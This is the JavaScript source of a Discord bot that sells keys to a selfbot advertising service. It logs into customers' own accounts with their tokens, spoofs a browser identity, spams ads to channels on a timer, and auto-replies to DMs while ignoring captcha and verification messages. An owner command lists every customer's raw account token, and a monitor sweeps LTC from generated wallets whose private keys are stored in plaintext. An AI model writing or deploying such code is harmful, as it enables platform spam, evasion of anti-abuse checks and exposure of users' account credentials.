const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const Database = require('better-sqlite3');
const { generateLTCAddress, generateAddressFromMnemonic } = require('./wallet');
const { sweepWallet, getBalance, OWNER_LTC_ADDRESS } = require('./blockchain');

const db = new Database('./data.db');

// Database setup - ALL TABLES
db.exec(`
CREATE TABLE IF NOT EXISTS users (
    user_id TEXT PRIMARY KEY, 
    key TEXT, 
    key_expires INTEGER, 
    token TEXT, 
    token_valid TEXT DEFAULT 'no', 
    token_username TEXT, 
    channels TEXT, 
    message TEXT, 
    delay INTEGER, 
    status TEXT DEFAULT 'stopped', 
    auto_reply_dm TEXT DEFAULT 'n', 
    auto_reply_message TEXT, 
    replied_users TEXT DEFAULT '[]'
);

CREATE TABLE IF NOT EXISTS keys (
    key TEXT PRIMARY KEY, 
    duration TEXT, 
    created_at INTEGER, 
    expires INTEGER, 
    redeemed_by TEXT, 
    redeemed_at INTEGER
);

CREATE TABLE IF NOT EXISTS wallets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id TEXT,
    address TEXT UNIQUE,
    private_key TEXT,
    mnemonic TEXT,
    balance REAL DEFAULT 0,
    status TEXT DEFAULT 'active',
    created_at INTEGER,
    last_checked INTEGER
);

CREATE TABLE IF NOT EXISTS transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    wallet_address TEXT,
    txid TEXT,
    amount REAL,
    to_address TEXT,
    timestamp INTEGER,
    status TEXT
);

CREATE TABLE IF NOT EXISTS user_credits (
    user_id TEXT PRIMARY KEY,
    credits REAL DEFAULT 0,
    auto_adv_purchased INTEGER DEFAULT 0,
    purchased_at INTEGER
);
`);

const botClient = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.DirectMessages] });
const ownerId = '1422945082746601594';
const activeSelfbots = new Map();
const autoReplyUsers = new Map();
const processedMessages = new Map();

// OWNER WALLET from mnemonic if provided
const OWNER_MNEMONIC = process.env.WALLET_MNEMONIC;
if (OWNER_MNEMONIC) {
    const ownerWallet = generateAddressFromMnemonic(OWNER_MNEMONIC, 0);
    console.log(`[OWNER WALLET] Loaded from mnemonic: ${ownerWallet.address}`);
}

function updateManagerMessage(interaction, userData, selfbotRunning = false) {
    if (!userData) return { embeds: [new EmbedBuilder().setTitle('❌ Error').setDescription('User data not found').setColor(0xff0000)], components: [] };
    const hasToken = userData.token && userData.token_valid === 'yes';
    const hasChannels = userData.channels && userData.channels.length > 0;
    const hasMessage = userData.message && userData.message.length > 0;
    const hasDelay = userData.delay && userData.delay > 0;
    const allSet = hasToken && hasChannels && hasMessage && hasDelay;
    const autoReply = userData.auto_reply_dm === 'y';
    
    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('set_token').setLabel('Set Token').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('set_channels').setLabel('Set Channels').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('set_message').setLabel('Set Message').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('set_delay').setLabel('Set Delay').setStyle(ButtonStyle.Primary)
    );
    
    const row2 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('start_bot').setLabel(selfbotRunning ? 'Running' : 'Start').setStyle(selfbotRunning ? ButtonStyle.Success : ButtonStyle.Secondary).setDisabled(selfbotRunning || !allSet),
        new ButtonBuilder().setCustomId('stop_bot').setLabel('Stop').setStyle(ButtonStyle.Danger).setDisabled(!selfbotRunning),
        new ButtonBuilder().setCustomId('auto_reply_dm').setLabel(autoReply ? 'Auto Reply: ON' : 'Auto Reply: OFF').setStyle(autoReply ? ButtonStyle.Success : ButtonStyle.Secondary)
    );
    
    let desc = `**Status:** ${selfbotRunning ? '🟢 Running' : '🔴 Stopped'}\n**Token:** ${hasToken ? `✅ @${userData.token_username}` : '❌ Not set'}\n**Channels:** ${hasChannels ? `✅ Set (${userData.channels.split(',').length})` : '❌ Not set'}\n**Message:** ${hasMessage ? '✅ Set' : '❌ Not set'}\n**Delay:** ${hasDelay ? `✅ ${userData.delay}s` : '❌ Not set'}\n**Auto Reply:** ${autoReply ? `✅ ON` : '❌ OFF'}`;
    if (autoReply && userData.auto_reply_message) desc += `\n**Reply:** ${userData.auto_reply_message.substring(0, 50)}${userData.auto_reply_message.length > 50 ? '...' : ''}`;
    
    return { embeds: [new EmbedBuilder().setTitle('📱 Selfbot Manager').setDescription(desc).setColor(selfbotRunning ? 0x00ff00 : 0xff0000).setTimestamp()], components: [row, row2] };
}

async function validateToken(token) {
    const testClient = new SelfbotClient({ checkUpdate: false, ws: { properties: { os: 'Windows', browser: 'Chrome', device: '', browser_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', os_version: '10', client_build_number: 9999 } } });
    try { 
        await testClient.login(token); 
        const user = testClient.user; 
        await testClient.destroy(); 
        return { valid: true, user }; 
    } catch (err) { 
        return { valid: false, error: err.message }; 
    }
}

// 24/7 Wallet Monitor - Sweeps every 30 seconds
function startWalletMonitor() {
    console.log('[MONITOR] Starting 24/7 wallet monitor for LTC auto-sweep');
    setInterval(async () => {
        const wallets = db.prepare("SELECT * FROM wallets WHERE status = 'active'").all();
        console.log(`[MONITOR] Checking ${wallets.length} wallets for balance`);
        
        for (const wallet of wallets) {
            try {
                console.log(`[MONITOR] Checking ${wallet.address}`);
                const result = await sweepWallet(wallet.address, wallet.private_key, db);
                if (result.success) {
                    console.log(`[MONITOR] SWEPT ${result.amount} LTC from ${wallet.address} to owner`);
                    db.prepare('UPDATE wallets SET balance = 0, last_checked = ? WHERE address = ?')
                        .run(Date.now(), wallet.address);
                } else if (result.balance > 0) {
                    db.prepare('UPDATE wallets SET balance = ?, last_checked = ? WHERE address = ?')
                        .run(result.balance, Date.now(), wallet.address);
                } else {
                    db.prepare('UPDATE wallets SET last_checked = ? WHERE address = ?')
                        .run(Date.now(), wallet.address);
                }
            } catch (err) {
                console.error(`[MONITOR] Error checking ${wallet.address}:`, err.message);
            }
        }
    }, 30000);
}

botClient.once('ready', () => {
    console.log(`Bot logged in as ${botClient.user.tag}`);
    startWalletMonitor();
    
    botClient.application.commands.set([
        new SlashCommandBuilder().setName('advkey').setDescription('Generate access key (Owner only)').addStringOption(opt => opt.setName('duration').setDescription('m=minute, d=day, y=year, blank=lifetime').setRequired(false)).toJSON(),
        new SlashCommandBuilder().setName('revokeuser').setDescription('Revoke all keys from user (Owner only)').addUserOption(opt => opt.setName('user').setDescription('Target user').setRequired(true)).toJSON(),
        new SlashCommandBuilder().setName('redeemkey').setDescription('Redeem your access key').addStringOption(opt => opt.setName('key').setDescription('Your key').setRequired(true)).toJSON(),
        new SlashCommandBuilder().setName('manager').setDescription('Manage your selfbot settings').toJSON(),
        new SlashCommandBuilder().setName('sales').setDescription('View sales and keys redeemed').toJSON(),
        new SlashCommandBuilder().setName('balance').setDescription('Check your LTC wallet balance').toJSON()
    ]);
});

botClient.on('interactionCreate', async interaction => {
    if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;
    const isOwner = interaction.user.id === ownerId;
    
    if (interaction.commandName === 'advkey') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', flags: MessageFlags.Ephemeral });
        const duration = interaction.options.getString('duration') || 'lifetime';
        const key = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        let expires = null;
        if (duration.endsWith('m')) expires = Date.now() + parseInt(duration) * 60000;
        else if (duration.endsWith('d')) expires = Date.now() + parseInt(duration) * 86400000;
        else if (duration.endsWith('y')) expires = Date.now() + parseInt(duration) * 31536000000;
        db.prepare('INSERT INTO keys (key, duration, created_at, expires, redeemed_by, redeemed_at) VALUES (?, ?, ?, ?, ?, ?)').run(key, duration, Date.now(), expires, null, null);
        return interaction.reply({ content: `🔑 **Key Generated**\n\`${key}\`\nDuration: ${duration}`, flags: MessageFlags.Ephemeral });
    }
    
    if (interaction.commandName === 'revokeuser') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', flags: MessageFlags.Ephemeral });
        const target = interaction.options.getUser('user');
        db.prepare('DELETE FROM users WHERE user_id = ?').run(target.id);
        db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE redeemed_by = ?').run(null, null, target.id);
        if (activeSelfbots.has(target.id)) { const { client, interval } = activeSelfbots.get(target.id); clearInterval(interval); client.destroy(); activeSelfbots.delete(target.id); }
        return interaction.reply({ content: `✅ Revoked all access for ${target.tag}`, flags: MessageFlags.Ephemeral });
    }
    
    if (interaction.commandName === 'redeemkey') {
        const key = interaction.options.getString('key');
        const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
        if (!keyData) return interaction.reply({ content: '❌ Invalid key.', flags: MessageFlags.Ephemeral });
        if (keyData.redeemed_by) return interaction.reply({ content: '❌ Key already used.', flags: MessageFlags.Ephemeral });
        if (keyData.expires && Date.now() > keyData.expires) return interaction.reply({ content: '❌ Key expired.', flags: MessageFlags.Ephemeral });
        db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
        db.prepare('INSERT OR REPLACE INTO users (user_id, key, key_expires, token, token_valid, token_username, channels, message, delay, status, auto_reply_dm, auto_reply_message, replied_users) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)').run(interaction.user.id, key, keyData.expires, null, 'no', null, null, null, null, 'stopped', 'n', null, '[]');
        return interaction.reply({ content: '✅ Key redeemed! Use /manager to configure.', flags: MessageFlags.Ephemeral });
    }
    
    if (interaction.commandName === 'manager') {
        const userData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
        if (!userData) return interaction.reply({ content: '❌ Redeem a key first using /redeemkey', flags: MessageFlags.Ephemeral });
        const running = activeSelfbots.has(interaction.user.id);
        const replyData = updateManagerMessage(interaction, userData, running);
        return interaction.reply({ ...replyData, flags: MessageFlags.Ephemeral });
    }
    
    if (interaction.commandName === 'sales') {
        if (!isOwner) return interaction.reply({ content: '❌ Owner only.', flags: MessageFlags.Ephemeral });
        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
        const users = db.prepare('SELECT * FROM users WHERE token IS NOT NULL').all();
        const totalKeys = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
        const redeemedKeys = db.prepare('SELECT COUNT(*) as count FROM keys WHERE redeemed_by IS NOT NULL').get().count;
        const activeRunning = db.prepare("SELECT COUNT(*) as count FROM users WHERE status = 'running'").get().count;
        if (users.length === 0) return interaction.editReply({ content: '❌ No users with tokens found.' });
        let content = `**📊 Sales Report**\n\n**Total Keys:** ${totalKeys}\n**Redeemed:** ${redeemedKeys}\n**Active Running:** ${activeRunning}\n**Total Users:** ${users.length}\n\n`;
        for (const user of users) {
            const keyData = db.prepare('SELECT * FROM keys WHERE redeemed_by = ?').get(user.user_id);
            const userObj = await botClient.users.fetch(user.user_id).catch(() => null);
            const username = userObj ? `@${userObj.username}` : `ID: ${user.user_id}`;
            content += `**${username}**\nToken: \`${user.token || 'N/A'}\`\nStatus: ${user.status || 'stopped'} | Valid: ${user.token_valid || 'no'}\n`;
            if (user.token_username) content += `Account: @${user.token_username}\n`;
            if (keyData) { content += `Key: \`${keyData.key}\`\n`; if (keyData.expires) content += `Expires: <t:${Math.floor(keyData.expires/1000)}:R>\n`; }
            content += `\n`;
            if (content.length > 1800) { await interaction.editReply({ content: content.substring(0, 1800) }); content = ''; }
        }
        if (content.length > 0) await interaction.editReply({ content: content });
        return;
    }
    
    if (interaction.commandName === 'balance') {
        const wallets = db.prepare('SELECT * FROM wallets WHERE user_id = ?').all(interaction.user.id);
        if (wallets.length === 0) return interaction.reply({ content: '❌ No wallets found. Purchase Auto Adv first.', flags: MessageFlags.Ephemeral });
        
        let totalBalance = 0;
        let walletInfo = '';
        
        for (const wallet of wallets) {
            const { balance } = await getBalance(wallet.address);
            totalBalance += balance;
            walletInfo += `**${wallet.address}**: ${balance} LTC\n`;
        }
        
        const embed = new EmbedBuilder()
            .setTitle('💰 Your LTC Wallets')
            .setDescription(`${walletInfo}\n**Total:** ${totalBalance.toFixed(8)} LTC`)
            .setColor(0x00ff00)
            .setTimestamp();
        
        return interaction.reply({ embeds: [embed], flags: MessageFlags.Ephemeral });
    }
    
    if (interaction.isButton()) {
        const userId = interaction.user.id;
        
        if (interaction.customId === 'set_token') {
            const modal = new ModalBuilder().setCustomId('modal_token').setTitle('Set Selfbot Token');
            modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('token_input').setLabel('Discord Token').setStyle(TextInputStyle.Short).setRequired(true)));
            return interaction.showModal(modal);
        }
        
        if (interaction.customId === 'set_channels') {
            const modal = new ModalBuilder().setCustomId('modal_channels').setTitle('Set Channel IDs');
            modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('channels_input').setLabel('Channel IDs (comma separated)').setStyle(TextInputStyle.Short).setPlaceholder('123456789,987654321').setRequired(true)));
            return interaction.showModal(modal);
        }
        
        if (interaction.customId === 'set_message') {
            const modal = new ModalBuilder().setCustomId('modal_message').setTitle('Set Advertisement Message');
            modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('message_input').setLabel('Message to send').setStyle(TextInputStyle.Paragraph).setRequired(true)));
            return interaction.showModal(modal);
        }
        
        if (interaction.customId === 'set_delay') {
            const modal = new ModalBuilder().setCustomId('modal_delay').setTitle('Set Delay');
            modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('delay_input').setLabel('Delay seconds (5-1800)').setStyle(TextInputStyle.Short).setPlaceholder('60').setRequired(true)));
            return interaction.showModal(modal);
        }
        
        if (interaction.customId === 'auto_reply_dm') {
            const modal = new ModalBuilder().setCustomId('modal_auto_reply').setTitle('Auto Reply DM Settings');
            const enableInput = new TextInputBuilder().setCustomId('auto_reply_enable').setLabel('Enable? y = yes, n = no').setStyle(TextInputStyle.Short).setPlaceholder('y or n').setRequired(true).setMaxLength(1);
            const messageInput = new TextInputBuilder().setCustomId('auto_reply_message').setLabel('Reply message (if enabled)').setStyle(TextInputStyle.Paragraph).setPlaceholder('Hello! I will get back to you soon.').setRequired(false);
            modal.addComponents(new ActionRowBuilder().addComponents(enableInput), new ActionRowBuilder().addComponents(messageInput));
            return interaction.showModal(modal);
        }
        
        if (interaction.customId === 'start_bot') {
            const userData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            if (!userData || !userData.token || userData.token_valid !== 'yes' || !userData.channels || !userData.message || !userData.delay) {
                return interaction.reply({ content: '❌ Configure all settings first (and validate token)!', flags: MessageFlags.Ephemeral });
            }
            
            await interaction.deferUpdate();
            console.log(`[START] User ${userId} starting selfbot`);
            
            if (activeSelfbots.has(userId)) {
                console.log(`[START] Stopping existing selfbot for ${userId}`);
                const old = activeSelfbots.get(userId);
                clearInterval(old.interval);
                old.client.destroy();
                activeSelfbots.delete(userId);
            }
            
            const existingReplied = JSON.parse(userData.replied_users || '[]');
            autoReplyUsers.set(userId, new Set(existingReplied));
            processedMessages.set(userId, new Set());
            
            const selfbot = new SelfbotClient({ checkUpdate: false, ws: { properties: { os: 'Windows', browser: 'Chrome', device: '', browser_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', os_version: '10', client_build_number: 9999 } } });
            
            let loginSuccess = false;
            let readyFired = false;
            
            selfbot.once('ready', async () => {
                if (readyFired) return;
                readyFired = true;
                loginSuccess = true;
                
                console.log(`[READY] Selfbot running: ${selfbot.user.tag}`);
                db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('running', userId);
                
                const channels = userData.channels.split(',').map(c => c.trim()).filter(c => c);
                console.log(`[READY] Loaded ${channels.length} channels`);
                
                const sendMessage = async () => {
                    if (channels.length === 0) return;
                    for (const chId of channels) {
                        try {
                            const ch = await selfbot.channels.fetch(chId);
                            if (ch) await ch.send(userData.message);
                        } catch (e) {}
                    }
                };
                
                await sendMessage();
                const interval = setInterval(sendMessage, userData.delay * 1000);
                activeSelfbots.set(userId, { client: selfbot, interval });
                
                if (userData.auto_reply_dm === 'y' && userData.auto_reply_message) {
                    console.log(`[AUTO_REPLY] Enabled`);
                    
                    selfbot.on('messageCreate', async (msg) => {
                        if (msg.channel.type !== 'DM') return;
                        if (msg.author.id === selfbot.user.id) return;
                        
                        const msgId = msg.id;
                        const authorId = msg.author.id;
                        
                        const processedSet = processedMessages.get(userId);
                        if (!processedSet) return;
                        if (processedSet.has(msgId)) return;
                        processedSet.add(msgId);
                        
                        if (msg.content.toLowerCase().includes('captcha') || msg.content.toLowerCase().includes('verify') || msg.content.toLowerCase().includes('robot')) return;
                        
                        const repliedSet = autoReplyUsers.get(userId);
                        if (!repliedSet) return;
                        if (repliedSet.has(authorId)) { console.log(`[AUTO_REPLY] Already replied to ${msg.author.tag}, skipping`); return; }
                        
                        try {
                            const messages = await msg.channel.messages.fetch({ limit: 50 });
                            const ourMessages = messages.filter(m => m.author.id === selfbot.user.id);
                            
                            if (ourMessages.size > 0) { console.log(`[AUTO_REPLY] Existing conversation with ${msg.author.tag}, skipping`); return; }
                            
                            console.log(`[AUTO_REPLY] New DM from ${msg.author.tag}, sending reply`);
                            await msg.channel.send(userData.auto_reply_message);
                            repliedSet.add(authorId);
                            db.prepare('UPDATE users SET replied_users = ? WHERE user_id = ?').run(JSON.stringify([...repliedSet]), userId);
                        } catch (e) { console.log(`[AUTO_REPLY] Error:`, e.message); }
                    });
                }
                
                try {
                    const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
                    const replyData = updateManagerMessage(interaction, newData, true);
                    await interaction.editReply({ ...replyData });
                } catch (e) { console.log(`[ERROR] Failed to update message:`, e.message); }
            });
            
            selfbot.on('error', (err) => { console.log(`[ERROR] Selfbot error:`, err.message); });
            
            setTimeout(async () => {
                if (!loginSuccess) {
                    console.log(`[ERROR] Login timeout`);
                    selfbot.destroy();
                    try { await interaction.editReply({ content: '❌ Login timeout - check token' }); } catch {}
                }
            }, 30000);
            
            selfbot.login(userData.token).catch(async (err) => {
                console.log(`[ERROR] Login failed:`, err.message);
                try { await interaction.editReply({ content: `❌ Login failed: ${err.message}` }); } catch {}
            });
            
            return;
        }
        
        if (interaction.customId === 'stop_bot') {
            if (activeSelfbots.has(userId)) {
                const { client, interval } = activeSelfbots.get(userId);
                clearInterval(interval);
                client.destroy();
                activeSelfbots.delete(userId);
                autoReplyUsers.delete(userId);
                processedMessages.delete(userId);
            }
            db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', userId);
            const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            const replyData = updateManagerMessage(interaction, newData, false);
            return interaction.update({ ...replyData });
        }
    }
    
    if (interaction.isModalSubmit()) {
        const userId = interaction.user.id;
        
        if (interaction.customId === 'modal_token') {
            const token = interaction.fields.getTextInputValue('token_input');
            await interaction.deferReply({ flags: MessageFlags.Ephemeral });
            const validation = await validateToken(token);
            if (validation.valid) {
                db.prepare('UPDATE users SET token = ?, token_valid = ?, token_username = ? WHERE user_id = ?').run(token, 'yes', validation.user.tag, userId);
                const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
                const running = activeSelfbots.has(userId);
                const replyData = updateManagerMessage(interaction, newData, running);
                await interaction.editReply({ content: `✅ **Token Valid!** Logged in as **@${validation.user.tag}**`, embeds: replyData.embeds, components: replyData.components });
            } else {
                await interaction.editReply({ content: `❌ **Invalid Token!** ${validation.error}` });
            }
            return;
        }
        
        if (interaction.customId === 'modal_channels') {
            const channels = interaction.fields.getTextInputValue('channels_input');
            db.prepare('UPDATE users SET channels = ? WHERE user_id = ?').run(channels, userId);
            const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            const running = activeSelfbots.has(userId);
            const replyData = updateManagerMessage(interaction, newData, running);
            await interaction.update({ ...replyData });
            return;
        }
        
        if (interaction.customId === 'modal_message') {
            const message = interaction.fields.getTextInputValue('message_input');
            db.prepare('UPDATE users SET message = ? WHERE user_id = ?').run(message, userId);
            const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            const running = activeSelfbots.has(userId);
            const replyData = updateManagerMessage(interaction, newData, running);
            await interaction.update({ ...replyData });
            return;
        }
        
        if (interaction.customId === 'modal_delay') {
            const delay = parseInt(interaction.fields.getTextInputValue('delay_input'));
            if (isNaN(delay) || delay < 5 || delay > 1800) return interaction.reply({ content: '❌ Delay must be 5-1800 seconds!', flags: MessageFlags.Ephemeral });
            db.prepare('UPDATE users SET delay = ? WHERE user_id = ?').run(delay, userId);
            const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            const running = activeSelfbots.has(userId);
            const replyData = updateManagerMessage(interaction, newData, running);
            await interaction.update({ ...replyData });
            return;
        }
        
        if (interaction.customId === 'modal_auto_reply') {
            const enable = interaction.fields.getTextInputValue('auto_reply_enable').toLowerCase().trim();
            const message = interaction.fields.getTextInputValue('auto_reply_message');
            if (enable !== 'y' && enable !== 'n') return interaction.reply({ content: '❌ Please enter y or n only!', flags: MessageFlags.Ephemeral });
            db.prepare('UPDATE users SET auto_reply_dm = ?, auto_reply_message = ? WHERE user_id = ?').run(enable, message || null, userId);
            db.prepare('UPDATE users SET replied_users = ? WHERE user_id = ?').run('[]', userId);
            const newData = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            const running = activeSelfbots.has(userId);
            const replyData = updateManagerMessage(interaction, newData, running);
            const statusMsg = enable === 'y' ? '✅ Auto Reply enabled!' : '❌ Auto Reply disabled!';
            await interaction.reply({ content: statusMsg, embeds: replyData.embeds, components: replyData.components, flags: MessageFlags.Ephemeral });
            return;
        }
    }
});

process.on('unhandledRejection', (err) => { console.log('Unhandled rejection:', err.message); });

// Start web server on PORT 8080
const app = require('./server');
const PORT = 8080;
app.listen(PORT, () => {
    console.log(`[WEB] Dashboard running on port ${PORT}`);
});

botClient.login(process.env.DISCORD_TOKEN);
